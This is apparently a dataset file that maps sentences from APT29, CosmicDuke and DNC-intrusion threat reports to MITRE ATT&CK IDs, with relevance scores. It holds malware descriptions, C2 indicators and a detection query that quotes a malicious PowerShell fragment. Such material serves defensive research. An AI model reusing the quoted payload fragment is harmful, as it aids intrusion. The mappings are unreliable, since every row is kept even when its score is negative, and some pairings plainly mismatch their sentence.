"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"Meanwhile, numerous alerts in Windows Defender Advanced Threat Protection exposed the attacker techniques across the attack chain.","S0120","S","0.915657","0.084343","0.915657","0.831314","True","keep"
"Third-party security researchers have attributed the attack to a threat actor named APT29 or CozyBear, which largely overlaps with the activity group that Microsoft calls YTTRIUM.","S0674","S","0.953463","0.046537","0.953463","0.906926","True","keep"
"The spear-phishing emails used in this attack resemble file-sharing notifications from OneDrive.","T1071.002","T","0.937079","0.062921","0.937079","0.874158","True","keep"
"Encoded content in the LNK file The encoded payload-another heavily obfuscated PowerShell script-is decoded and executed: Decoded second script The second script carves out two additional resources from within the .LNK file: ds7002.PDF (A decoy PDF) cyzfc.dat (The first stage implant) Command and control The first-stage DLL, cyzfc.dat, is created by the PowerShell script in the path %AppData%\Local\cyzfc.dat.","S1024","S","0.927844","0.072157","0.927844","0.855687","True","keep"
"The second stage is an instance of Cobalt Strike, a commercially available penetration testing tool, which performs the following steps: Define a local named pipe with the format \\.\pipe\MSSE-<number>-server, where <number> is a random number between 0 and 9897 Connecting to the pipe, write it global data with size 0x3FE00 Implement a backdoor over the named pipe: Read from the pipe (maximum 0x3FE00 bytes) to an allocated buffer DeXOR the payload onto a new RW memory region, this time with a much simple XOR key: simple XORing every 4 bytes with 0x7CC2885F Turn the region to be RX Create a thread that starts running the payload' This configuration information is de-XORed at the third payload runtime: The configuration information itself mostly contains C&C information: CobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware.","T0865","T","0.94023","0.05977","0.94023","0.88046","True","keep"
"This configuration information is de-XORed at the third payload runtime: The configuration information itself mostly contains C&C information: CobaltStrike is a feature-rich penetration testing tool that provides remote attackers with a wide range of capabilities, including escalating privileges, capturing user input, executing arbitrary commands through PowerShell or WMI, performing reconnaissance, communicating with C&C servers over various protocols, and downloading and installing additional malware.","T0888","T","0.968883","0.031117","0.968883","0.937766","True","keep"
"If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today.","T1566.001","T","0.883201","0.116799","0.883201","0.766402","True","keep"
"Alerts with the following titles are indicative of this attack activity: Artifacts associated with an advanced threat detected Network activity associated with an advanced threat detected Low-reputation arbitrary code executed by signed executable Suspicious LNK file opened Network protection blocks connections to malicious domains and IP addresses.","T1030","T","0.978579","0.021421","0.978579","0.957158","True","keep"
"2: C&C connection NetworkCommunicationEvents | where EventTime > ago(10d) | where RemoteUrl == ""pandorasong.com"" //Query 3: Malicious PowerShell ProcessCreationEvents | where EventTime > ago(10d) | where ProcessCommandLine contains ""-noni -ep bypass $zk=' JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwNjIzYjY7JHRiPSJkczcwMDIubG5rIjtp ZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lPUdldC1DaGlsZEl0""","S0166","S","0.317302","0.682698","0.317302","-0.365396","True","keep"
"URLs hxxps://www.jmj[.]com/personal/nauerthn_state_gov/VFVKRTdRSm C&C servers pandorasong[.]com (95.216.59.92) (first-stage C&C server) Talk to us Questions, concerns, or insights on this story?","S0050","S","0.524716","0.475284","0.524716","0.049432","True","keep"
"A few older samples in Group #3 still use the original MiniDuke loader, while most recent ones are using the updated MiniDuke loader. Meanwhile, the most recent sample in Group #3, which uses the updated loader with t the SHA1 value fecdba1d903a51499a3953b4df1d850fbd5438bd, also connects to another server at IP address 178.21.172.157. rcs.18.jpg rcs.DSC_1365527283.jpg GROUP #3 ?","S0569","S","0.946642","0.053358","0.946642","0.893284","True","keep"
"Securelist; C. Raiu, I. Soumenkov, K. Baumgartner & V. Kamluk; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; https://www.securelist.com/en/downloads/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf","S0596","S","0.854886","0.145114","0.854886","0.709772","True","keep"
"The program database (PDB) path y Server address and credentials y The loader y Filenames and decoy content Full list of the servers contacted by samples in these groupings in available in Appendix B | Servers on page 15.","T1574.007","T","0.947661","0.052339","0.947661","0.895322","True","keep"
"fb3b8f6494b211386381a7e4f6524d3e4643c9e9 b072577447cdf3936d95e612057e510dd3435963 f513b21738ae3083d79e4fa1039889e1c3efff58 c715e94dd187f3626f1b3e1511ae11525abf91e6 3e76dfa82161c64417e214b7607ad22ab40a8d69 ef3ce46a81d3f30fbcfbe5e0db18284329cc0d99 620165967306d08d6a38dbd1381d84c71d62dea2 Info-stealers Loaders *.tmp 4e3c9d7eb8302739e6931a3b5b605efe8f211e51 55f83ff166ab8978d6ce38e80fde858cf29e660b","S0177","S","0.355229","0.644771","0.355229","-0.289542","True","keep"
"For example, the credentials and same FTP folder structure used by the old samples have been used on another Cosmu FTP server that is still active.","TA0006","T","0.933566","0.066434","0.933566","0.867132","True","keep"
"A few older samples in Group #3 still use the original MiniDuke loader, while most recent ones are using the updated MiniDuke loader. FIGURE 1: SIMPLIFIED OVERVIEW OF COSMICDUKE'S CHAIN OF ACTION MiniDuke Loader Cosmu Info-stealer Exploit Dropper Decoy Attacker INTRODUCTION These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis. This is the only server that the samples with the original MiniDuke loader use.","S0177","S","0.96563","0.03437","0.96563","0.93126","True","keep"
"These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis.","S0137","S","0.976721","0.023279","0.976721","0.953442","True","keep"
"Key logging is skipped if one of the following AV process is running on the system: y avp.exe y acs.exe y outpost.exe y mcvsescn.exe y mcods.exe y navapsvc.exe y kav.exe y AvastSvc.exe y AvastUi.exe y nod32krn.exe y nod32.exe y ekern.exe y dwengine.exe y MsMpEng.exe y msseces.exe y ekrn.exe y savservice.exe y scfservice.exe y savadminservice.exe SCREENSHOTTER Cosmu takes screenshots periodically and sends them to the attacker, together with other stolen data.","T1546.002","T","0.079845","0.920155","0.079845","-0.84031","True","keep"
"The keylogger is implemented using the GetKeyboardState API.","T1056.001","T","0.831744","0.168256","0.831744","0.663488","True","keep"
"y Others ?? Windows credentials LM and NT hashes, cached domain passwords, LSA secrets.","T1552.001","T","0.247096","0.752904","0.247096","-0.505808","True","keep"
"?? Google Desktop Cosmu decrypts and steals saved credentials from Google Desktop.","S0276","S","0.967493","0.032507","0.967493","0.934986","True","keep"
"?? Google Desktop Cosmu decrypts and steals saved credentials from Google Desktop. ?? Google Talk Cosmu decrypts and steals saved credentials from Google Talk.","T1552.001","T","0.881583","0.118417","0.881583","0.763166","True","keep"
"?? Google Talk Cosmu decrypts and steals saved credentials from Google Talk.","S0290","S","0.907625","0.092375","0.907625","0.81525","True","keep"
"The attack was publicly documented in 2006","T1406","T","0.586916","0.413084","0.586916","0.173832","True","keep"
"PERSISTENCE Cosmu has a couple of different mechanisms for achieving persistence on the system.","T1070.009","T","0.835709","0.164291","0.835709","0.671418","True","keep"
"An interesting detail is that Cosmu skips searching the removable drive if the volume name is 'trandescend' (case insensitive comparison). COSMICDUKE Cosmu with a twist of MiniDuke TLP: WHITE Cosmu is the first malware family we have seen to share code with MiniDuke. FIGURE 1: SIMPLIFIED OVERVIEW OF COSMICDUKE'S CHAIN OF ACTION MiniDuke Loader Cosmu Info-stealer Exploit Dropper Decoy Attacker INTRODUCTION MAIN COMPONENT: INFO-STEALER The Cosmu info-stealer is the main component of the CosmicDuke malware. PERSISTENCE Cosmu has a couple of different mechanisms for achieving persistence on the system. TARGETED FILETYPES Cosmu searches the hard drives and network drives for files that match any of the below patterns: y *.doc y We have seen dozens of Cosmu samples that share code with MiniDuke.","S0188","S","0.967902","0.032098","0.967902","0.935804","True","keep"
"MAIN COMPONENT: INFO-STEALER The Cosmu info-stealer is the main component of the CosmicDuke malware. This particular dropper file is notable in that its info-stealer (SHA1:f513b21738ae3083d79e4fa1039889e1c3efff58) is the same one used by the exploit file named 'Bulletin-PISMNo-31-(625)-March-10-2014.pdf'.","S0491","S","0.783015","0.216985","0.783015","0.56603","True","keep"
"Polish Institute of International Affairs; http://www.pism.pl/en CIRCL - Computer Incident Response Center Luxembourg; Analysis of a stage 3 Miniduke sample; published 30 May 2013; http://www.circl.lu/assets/files/tr-14/circl-analysisreport-miniduke-stage3-public.pdf Laboratory of Cryptography and System Security (CrySyS Lab); MiniDuke: Indicators; published 27 February 2013; http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf FIGURE 3: FILENAMES AND SHA1 VALUES OF COSMICDUKE EXPLOIT FILES","S1168","S","0.898687","0.101313","0.898687","0.797374","True","keep"
"Also of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. Cosmu is the first malware family we have seen to share code with MiniDuke. We have seen dozens of Cosmu samples that share code with MiniDuke.","S0023","S","0.855497","0.144503","0.855497","0.710994","True","keep"
"Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3] ) that also shows the same compilation date.","S0167","S","0.910856","0.089144","0.910856","0.821712","True","keep"
"The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke.","S0177","S","0.96261","0.03739","0.96261","0.92522","True","keep"
"Perhaps coincidentally, we found one MiniDuke sample (originally reported by CrySys [3] ) that also shows the same compilation date. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012).","S0140","S","0.875186","0.124813","0.875186","0.750373","True","keep"
"Also of interest is that once the MiniDuke loader was updated, we saw CosmicDuke samples take the updated loader into use in mid-April 1 2014, a few months after MiniDuke started using the latest loader in mid-December 2013. It does not use an exploit and it does not use a dropper; instead the loader has a filename (Sivil Durum Raporu Kriz Merk?fdp.izay.exe) that uses the same RLO trick used in Group #1 samples. The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author(s) of Cosmu and MiniDuke. The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. The updated loader has PDB path, C:\Projects\NEMESIS\ nemesis-gemina\nemesis\bin\carriers\ezlzma_x86_exe.","T1645","T","0.960997","0.039003","0.960997","0.921994","True","keep"
"LOADER: MINIDUKE 3RD STAGE The CosmicDuke samples we analyzed used the same loader as MiniDuke's stage 3 [2] samples, making this the first occasion in which we've seen other malware using this particular loader.","S0062","S","0.952539","0.047461","0.952539","0.905078","True","keep"
"The code used by CosmicDuke to exploit the CVE-20110611 vulnerability appears to be derived from this proofof-concept code that was made available in early 2011: y http://www.exploit-db.com/exploits/17473/ When the file is launched, the object exploits the known CVE-2011-0611 vulnerability in specific versions of Adobe Flash, Reader and Acrobat products.","T0890","T","0.838353","0.161647","0.838353","0.676706","True","keep"
"DROPPER: DECOYS CosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched.","T1204.003","T","0.884779","0.115221","0.884779","0.769558","True","keep"
"The oldest Cosmu samples we saw have a compilation timestamp of 2001-09-25. This seems to be a common fake product name used in the latest Cosmu samples.","S0076","S","0.779121","0.22088","0.779121","0.558241","True","keep"
"COSMICDUKE Cosmu with a twist of MiniDuke TLP: WHITE CosmicDuke infections start by tricking victims into opening either a PDF file that contains an exploit or a Windows executable whose filename is manipulated to make it look like a document or image file. For convenience, we decided to name the samples showing this amalgamation of MiniDuke-derived loader and Cosmu-derived payload CosmicDuke . Image 1: Screenshot of folder containing CosmicDuke dropper files GROUP #1 DROPPERS: rcs .?????????? .doc In this document we report on our analysis of CosmicDuke - the first malware seen to include code from both the notorious MiniDuke APT trojan and another longstanding threat, the informationstealing Cosmu family. SOCIAL ENGINEERING Less technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file. The code used by CosmicDuke to exploit the CVE-20110611 vulnerability appears to be derived from this proofof-concept code that was made available in early 2011: y http://www.exploit-db.com/exploits/17473/ The filenames and content used in CosmicDuke's attack files to lure victims into opening them contain references to the countries of Ukraine, Poland, Turkey and Russia,either generally in use of language or included detail, or in allusions to events or institutions. The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting. When active on an infected machine, CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers, some of which were active at the time of writing.","S0665","S","0.956587","0.043413","0.956587","0.913174","True","keep"
"In this document we report on our analysis of CosmicDuke - the first malware seen to include code from both the notorious MiniDuke APT trojan and another longstanding threat, the informationstealing Cosmu family.","S0082","S","0.94429","0.05571","0.94429","0.88858","True","keep"
"When active on an infected machine, CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers, some of which were active at the time of writing.","T1552.001","T","0.940751","0.059249","0.940751","0.881502","True","keep"
"F-SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper CONTENTS INTRODUCTION Scope Target Arrival Infection Data theft Data transmission TECHNICAL DETAILS Dropper: RLO Dropper: Decoys Exploit Loader: MiniDuke 3rd Stage Main Component: Info-stealer RC4 Encryption Samples Comparison APPENDIX","TA0009","T","0.944713","0.055287","0.944713","0.889426","True","keep"
"While investigating MiniDuke loaders in April 2014, we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information-stealers, which we saw as long ago as 2001.","S0086","S","0.914993","0.085007","0.914993","0.829986","True","keep"
"This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples. While investigating MiniDuke loaders in April 2014, we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information-stealers, which we saw as long ago as 2001.","S0177","S","0.971965","0.028035","0.971965","0.94393","True","keep"
"The data collection components include a keylogger, clipboard stealer, screenshotter, and password stealers for a variety of popular chat, email and web browsing programs. The keylogger is implemented using the GetKeyboardState API.","T1056.001","T","0.945932","0.054068","0.945932","0.891864","True","keep"
"The data collection components include a keylogger, clipboard stealer, screenshotter, and password stealers for a variety of popular chat, email and web browsing programs.","S0107","S","0.977138","0.022863","0.977138","0.954275","True","keep"
"It also collects information about the files on the system, and has the capability to export cryptographic certificates and the associated private keys.","T1552","T","0.963173","0.036827","0.963173","0.926346","True","keep"
"F-Secure has detections for all the different malicious components used by the Cosmu variants described in this report.","S1184","S","0.951496","0.048504","0.951496","0.902992","True","keep"
"For convenience, we decided to name the samples showing this amalgamation of MiniDuke-derived loader and Cosmu-derived payload CosmicDuke . Group #1 All samples in this group have a PDB path on the infected system's C:\ drive that contains the directory 'botgenstudio'. Group #2 All samples in this group have a PDB path that contains directories named 'NITRO' and 'SVA'. The full details of how the samples were grouped is listed on page 11; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered, and the decoy documents shown. The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011, which predates the oldest publicly documented MiniDuke sample (with a recorded loader compilation date of June 18 2012). The samples we analyzed of the exploit-based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right (see 'Appendix A | Samples' for more details). This includes examining the attack files used to infect targets, the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info-stealers used in the samples. This is the only server that the samples with the original MiniDuke loader use.","S0254","S","0.971677","0.028323","0.971677","0.943354","True","keep"
"DOCUMENT-BASED EXPLOIT CosmicDuke malware samples that use exploits to gain entry onto a target system (referred to as exploit files in the rest of this document) start with a malicious Flash object embedded into a PDF file.","S0051","S","0.974937","0.025063","0.974937","0.949874","True","keep"
"Unlike the CosmicDuke files geared towards social engineering, the exploit files do not actually display any documents to the user as a form of distraction; the malware simply straightaway exploits the vulnerability.","T1204.002","T","0.964806","0.035194","0.964806","0.929612","True","keep"
"It was executed via rundll32 commands such as: rundll32.exe ""C:\Windows\twain_64.dll"" In addition, FANCY BEAR's X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands.","T0867","T","0.931388","0.068612","0.931388","0.862776","True","keep"
"Powershell version of credential theft tool MimiKatz was also used by the actors to facilitate credential acquisition for lateral movement purposes.","S0007","S","0.937298","0.062702","0.937298","0.874596","True","keep"
"The encryption keys in the script were different on every system.","T1573.001","T","0.545692","0.454308","0.545692","0.091384","True","keep"
"sWP 'Wmi' 'Wmi' $aeK $aeI | Out-Null This one-line powershell command, stored only in WMI database, establishes an encrypted connection to C2 and downloads additional powershell modules from it, executing them in memory.","S0184","S","0.928955","0.071045","0.928955","0.85791","True","keep"
"This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones.","TA0104","T","0.956011","0.043989","0.956011","0.912022","True","keep"
"FANCY BEAR (also known as Sofacy or APT 28) is a separate Russian-based threat actor, which has been active since mid 2000s, and has been responsible for targeted intrusion campaigns against the Aerospace, Defense, Energy, Government and Media sectors. This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRage droppers, and even malware for Linux, OSX, IOS, Android and Windows Phones.","S0023","S","0.965803","0.034197","0.965803","0.931606","True","keep"
"An HTTP protocol with encrypted payload is used for the Command & Control communication.","T0869","T","0.857878","0.142122","0.857878","0.715756","True","keep"
"They have extensive checks for the various security software that is installed on the system and their specific configurations.","S0194","S","0.983799","0.016201","0.983799","0.967598","True","keep"
"In addition to the US government, they have targeted organizations across the Defense, Energy, Extractive, Financial, Insurance, Legal, Manufacturing Media, Think Tanks, Pharmaceutical, Research and Technology industries, along with Universities. They have extensive checks for the various security software that is installed on the system and their specific configurations.","T1602","T","0.959078","0.040922","0.959078","0.918156","True","keep"
"COZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff.","S1105","S","0.965955","0.034045","0.965955","0.93191","True","keep"
"In particular, we identified advanced methods consistent with nation-state level capabilities including deliberate targeting and 'access management' tradecraft - both groups were constantly going back into the environment to change out their implants, modify persistent methods, move to new Command & Control channels and perform other tasks to try to stay ahead of being detected.","TA0101","T","0.942026","0.057974","0.942026","0.884052","True","keep"
"'???the first day that we found activity on our network that was unusual, nefarious by adversaries???' ""we saw sort of very loud activity??? on one of our Window servers that couldn't have been done by one of us???an authorized user. After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we initiated a coordinated remediation event to ensure the intruders were removed and could not regain access.","T1071.002","T","0.948178","0.051822","0.948178","0.896356","True","keep"
"After conducting this analysis and identifying the adversaries on the network, on June 10, 2016 we initiated a coordinated remediation event to ensure the intruders were removed and could not regain access.","T0872","T","0.912651","0.087349","0.912651","0.825302","True","keep"
"third-party industry experts, like CrowdStrike, to investigate and remediate cyber attacks when they suspect a breach even if they are collaborating with law enforcement.","TA0007","T","0.955857","0.044143","0.955857","0.911714","True","keep"
"At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016.' COZY BEAR (also referred to in some industry reports as CozyDuke or APT 29) is the adversary group that last year successfully infiltrated the unclassified networks of the White House, State Department, and US Joint Chiefs of Staff.","S0651","S","0.951588","0.048412","0.951588","0.903176","True","keep"
"Shawn Henry stated in his testimony that CrowdStrike had indicators of exfiltration (page 32 of the testimony): 'Counsel just reminded me that, as it relates to the DNC' we have indicators that data was exfiltrated. Shawn Henry stated in his testimony to the House Intelligence Committee that CrowdStrike had indicators of exfiltration (page 32) and that data had clearly left the network.","T1560","T","0.4013","0.5987","0.4013","-0.1974","True","keep"
"On page 32 of the testimony, Henry also explains that 'We don't have video of it happening, but there are indicators that it happened' and 'we did not have concrete evidence that data was exfiltrated from the DNC, but we have indicators that it was exfiltrated.'","S0400","S","0.621842","0.378158","0.621842","0.243684","True","keep"
"Of note, it is a standard practice in incident response to first coordinate a remediation event to prevent the adversary from doing further damage and following that to fully restore network functionality.","TA0041","T","0.890096","0.109904","0.890096","0.780192","True","keep"
"'???the first day that we found activity on our network that was unusual, nefarious by adversaries???' ""we saw sort of very loud activity??? on one of our Window servers that couldn't have been done by one of us???an authorized user.","T1418","T","0.775808","0.224192","0.775808","0.551616","True","keep"
"Together with our network of the top channel partners and over 200 service providers, we're on a mission to make sure everyone has the enterprise-grade cyber security we all need.","T1011","T","0.750721","0.249279","0.750721","0.501442","True","keep"
"ABOUT F-SECURE Nobody has better visibility into real-life cyber attacks than F-Secure. Founded in 1988, F-Secure is listed on the NASDAQ OMX Helsinki Ltd.","S1184","S","0.731809","0.268191","0.731809","0.463618","True","keep"
"Trojan:W64/CloudDuke.B Backdoor:W32/SeaDuke.","S0053","S","0.114223","0.885777","0.114223","-0.771554","True","keep"
"Trojan:W32/OnionDuke.C Trojan:W32/OnionDuke.","S1133","S","0.247977","0.752023","0.247977","-0.504046","True","keep"
"Trojan:W32/CosmicDuke.C Exploit:W32/CosmicDuke.","S1133","S","0.25343","0.74657","0.25343","-0.49314","True","keep"
"199.231.188.109 212.76.128.149 46.246.120.178 46.246.120.178 5.45.66.134 50.7.192.146 64.18.143.66 66.29.115.55 69.59.28.57 82.146.47.163 82.146.51.22 83.149.74.73 85.17.143.149 87.118.106.55 87.255.77.36 88.150.208.207 91.221.66.242 91.224.141.235 94.242.199.88 96.9.182.37 F-Secure detection names Backdoor:W32/MiniDuke.","S0568","S","0.135022","0.864978","0.135022","-0.729956","True","keep"
"Malware SHA1 hashes 42e6da9a08802b5ce5d1f754d4567665637b47bc CloudDuke Malware SHA1 hashes 04299c0b549d4a46154e0a754dda2bc9e43dff76 10b31a17449705be20890ddd8ad97a2feb093674 2e27c59f0cf0dbf81466cc63d87d421b33843e87 /.notdef 2f53bfcd2016d506674d0a05852318f9e8188ee1 317bde14307d8777d613280546f47dd0ce54f95b /.notdef 44403a3e51e337c1372b0becdab74313125452c7 47f26990d063c947debbde0e10bd267fb0f32719 /.notdef 4800d67ea326e6d037198abd3d95f4ed59449313 52d44e936388b77a0afdb21b099cf83ed6cbaa6f","S0574","S","0.208728","0.791272","0.208728","-0.582544","True","keep"
"f3dcbc016393497f681e12628ad9411c27e57d48 SeaDuke Malware SHA1 hashes 3459d9c27c31c0e8b2ea5b21fdc200e784c7edf4 aa7cf4f1269fa7bca784a18e5cecab962b901cc2 bb71254fbd41855e8e70f05231ce77fee6f00388 HammerDuke","S0574","S","0.259954","0.740046","0.259954","-0.480092","True","keep"
"OnionDuke Malware SHA1 hashes 073faad9c18dbe0e0285b2747eae0c629e56830c 145c5081037fad98fa72aa4d6dc6c193fdb1c127 16b632b4076a458b6e2087d64a42764d86b5b021 /.notdef 1e200fbb02dc4a51ea3ede0b6d1ff9004f07fe73 22bae6be13561cec758d25fa7adac89e67a1f33a 25e0af331b8e9fed64dc0df71a2687be348100e8 /.notdef 3bf6b0d49b8e594f8b59eec98942e1380e16dd22 /.notdef 42429d0c0cade08cfe4f72dcd77892b883e8a4bc /.notdef 5ccff14ce7c1732fadfe74af95a912093007357f 61283ef203f4286f1d366a57e077b0a581be1659","S0054","S","0.159531","0.840469","0.159531","-0.680938","True","keep"
"e95e2c166be39a4d9cd671531b376b1a8ceb4a55 edf74413a6e2763147184b5e1b8732537a854365 /.notdef efcb9be7bf162980187237bcb50f4da2d55430c2 /.notdef f62600984c5086f2da3d70bc1f5042cf464f928d CozyDuke Malware SHA1 hashes 01d3973e1bb46e2b75034736991c567862a11263 04aefbf1527536159d72d20dea907cbd080793e3 /.notdef 0e020c03fffabc6d20eca67f559c46b4939bb4f4 /.notdef 1e5f6a5624a9e5472d547b8aa54c6d146813f91d 207be5648c0a2e48be98dc4dc1d5d16944189219","S0046","S","0.339396","0.660604","0.339396","-0.321208","True","keep"
"MiniDuke Malware SHA1 hashes 00852745cb40730dc333124549a768b471dff4bc 03661a5e2352a797233c23883b25bb652f03f205 045867051a6052d1d910abfcb24a7674bcc046ca","S0137","S","0.175633","0.824367","0.175633","-0.648734","True","keep"
"GeminiDuke Malware SHA1 hashes 3ed561786ca07c8e9862f4f682c1828a039d6dd4 6b0b8ad038c7ae2efbad066b8ba22de859b81f98 a3653091334892cf97a55715c7555c8881230bc4 b14b9241197c667f00f86d096d71c47d6fa9aca6 c011552d61ac5a87d95e43b90f2bf13077856def CosmicDuke Malware SHA1 hashes 01e5080b832c6e4fcb7b9d06caffe03dab8d95da 02f55947402689ec755356ab6b0345a592446da7","S0050","S","0.19157","0.80843","0.19157","-0.61686","True","keep"
"Available: https://securelist.com/blog/research/71443/minidionis-one-more-apt-with-a-usage-of-cloud- drives/ malware@prevenity; Malware w 5 rocznic?? katastrofy samolotu; published 22 April 2015;","S1151","S","0.686651","0.313349","0.686651","0.373302","True","keep"
"com/2015/07/ tracking-minidionis-cozycars-new-ride-is-related-to-seaduke/ Segey Lozhkin; Securelist; Minidionis - one more APT with a usage of cloud drives; published 16 July 2015;","S0054","S","0.476952","0.523048","0.476952","-0.046096","True","keep"
"CLOUDDUKE First known activity June 2015 Most recent known activity Summer 2015 Other names MiniDionis, CloudLook C&C communication methods HTTP (S), Microsoft OneDrive Known toolset components ??? Downloader ??? Loader ??? Two backdoor variants CloudDuke is a malware toolset known to consist of, at least, a downloader, a loader and two backdoor variants. com/2015/07/ tracking-minidionis-cozycars-new-ride-is-related-to-seaduke/ Segey Lozhkin; Securelist; Minidionis - one more APT with a usage of cloud drives; published 16 July 2015; com/weblog/archives/00002822.html Brandon Levene, Robert Falcone and Richard Wartell; Palo Alto Networks; Tracking MiniDionis: CozyCar's New Ride Is Related to Seaduke; published 14 July 2015; http://researchcenter.","S0405","S","0.8442","0.1558","0.8442","0.6884","True","keep"
"Available: https://www.f-secure.com/ documents/996508/ 1030745/CozyDuke Symantec Security Response; 'Forkmeiamfamous': Seaduke, latest weapon in the Duke armory; published 13 July 2015; [Online].","S0185","S","0.768546","0.231454","0.768546","0.537092","True","keep"
"Available: http://www.boost.org/users/ history/ version_1_54_0.html Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014;","S0175","S","0.962618","0.037382","0.962618","0.925236","True","keep"
"Available: http://blog.trendmicro.com/trendlabs-security- intelligence/pawnstorms-domestic-spying-campaign-revealed-ukraine-and-us-top-global-targets/ GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014;","S0665","S","0.911475","0.088525","0.911475","0.82295","True","keep"
"Available: http://www.crysys.hu/miniduke/miniduke_indicators_public.pdf Mikko Hypponen; F-Secure Weblog; Targeted Attacks and Ukraine; published 1 April 2014;","S0697","S","0.610039","0.389961","0.610039","0.220078","True","keep"
"pdf Laboratory of Cryptography and System Security (CrySyS Lab); Miniduke: Indicators; published 27 February 2013;","S0458","S","0.952143","0.047857","0.952143","0.904286","True","keep"
"2013: CosmicDuke's war on drugs In a surprising turn of events, in September 2013 a CosmicDuke campaign was observed targeting Russian speakers involved in the trade of illegal and controlled substances (image 5, above). A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers. Available: http://seclists.org/fulldisclosure/2010/Jan/341 Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples. COSMICDUKE First known activity January 2010 Most recent known activity Summer 2015 Other names Tinybaron, BotgenStudios, NemesisGemina C&C communication methods HTTP (S), FTP, WebDav Known toolset components ??? Information stealer ??? Multiple loaders ??? Privilege escalation component ??? Multiple persistence components The CosmicDuke toolset is designed around a main information stealer component. Concurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. CosmicDuke's information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user files with file extensions that match a predefined list Exporting the users cryptographic certificates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to exfiltrate the collected data to a hardcoded C&C server. CosmicDuke's moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasionfocused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. During this period of CosmicDuke testing and development, the Duke authors also started experimenting with the use of privilege escalation vulnerabilities. Further reading Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; https://www.fsecure.com/ documents/996508/1030745/cosmicduke_ whitepaper.pdf GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; https://securelist. com/blog/ incidents/64107/miniduke-is-back-nemesis- gemina-and-the-botgen-studio/ In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modifications and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. Some hints about the history of the 'MiniDuke loader' were noted in the CosmicDuke whitepaper we published [5] in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. Specifically, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. The emergence of CosmicDuke in the Caucasus The spring of 2010 saw continued PinchDuke campaigns against Turkey and Georgia, but also numerous campaigns against other members of the Commonwealth of Independent States such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. 